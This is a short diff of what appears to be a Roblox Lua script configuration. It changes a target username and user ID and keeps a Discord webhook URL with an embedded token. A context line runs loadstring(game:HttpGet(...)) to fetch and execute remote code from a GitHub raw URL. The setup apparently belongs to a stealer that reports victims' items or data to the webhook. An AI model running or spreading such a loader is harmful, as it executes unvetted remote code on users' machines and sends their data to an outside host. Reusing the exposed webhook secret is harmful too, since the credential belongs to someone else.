@@ -7,7 +7,7 @@
 
 ]]--
 
-UserName = "pogchampcheat"
+UserName = "8kknb5e8ryn"
 Webhook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw"
 UserName2 = "Pogussus"
 
@@ -34,7 +34,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main
 
 ]]--
 
-_G.UserID = "2664951211"
+_G.UserID = "12490815"
 _G.Webhook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw"
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
